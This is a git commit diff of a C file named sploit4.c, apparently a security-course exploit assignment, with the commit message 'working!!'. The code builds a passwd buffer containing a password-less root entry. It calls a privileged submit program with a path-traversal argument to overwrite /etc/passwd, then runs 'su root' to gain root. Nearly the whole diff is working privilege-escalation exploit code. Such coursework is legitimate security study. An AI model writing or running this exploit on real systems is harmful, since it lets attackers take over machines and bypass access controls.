0fa5082f39fec20bff7f551ddbb875e79f74923c
xilingwu <wuxiling@outlook.com>
2019-06-06 00:37:28 -0400

    working!!

--- a1/sploit4.c
+++ a1/sploit4.c
@@ -14,40 +14,49 @@
 
 int main() {
     FILE *fp;
-	char *args[4];
-	char *env[1];
+	//char *args[4];
+	//char *env[1];
 
 	unsigned char argbuf[4017]; 
 
 	char *ptr;
+    char newroot[] = "root::0:0:root:/root:/bin/bash\n";
+    char user[] = "user::1000:1000::/home/user:/bin/sh\n";
 
     // create the argbuf
     memset(argbuf, ' ', sizeof(unsigned char)*4016);
 
-    ptr = argbuf + 984;
-    memcpy(ptr, "newroot::0:0:root:/root:/bin/bash", strlen("newroot::0:0:root:/root:/bin/bash"));
+    ptr = argbuf + 994;
+    memcpy(ptr, user, strlen(user));
+    ptr = argbuf + 1094;
+    memcpy(ptr, newroot, strlen(newroot));
 
+    system("mkdir -p /home/user/submit/user/etc/etc2");
+    system("mkdir -p etc");
 
-    fp = fopen("passwd", "wb");
+    if (chdir("/home/user/submit/user/etc/etc2") == -1)
+    {
+        printf("Failed to change directory:");
+    }
+    fp = fopen("/home/user/etc/passwd", "wb");
     fwrite(argbuf, 1, sizeof(argbuf), fp);
     fclose(fp);
 
-
-    //system("echo 'newroot::0:0:root:/root:/bin/bash' >> passwd");
-	
     
-	//symlink("/etc/passwd", "passwd");
-	args[0] = TARGET;
-	args[1] = "../../.././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././passwd"; 
+    system("/usr/local/bin/submitV2 ./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../etc/passwd");
+    //system("/share/submit ./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../etc/passwd");
+
+	/*args[0] = TARGET;
+	args[1] = "./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../etc/passwd"; 
     args[2] = NULL;
     args[3] = NULL;
 
 	env[0] = NULL;
 
 	execve(TARGET, args, env);
-    fprintf(stderr, "execve failed\n");
+    fprintf(stderr, "execve failed\n");*/
     
-
+    system("su root");
 	
 	return 1;
 }
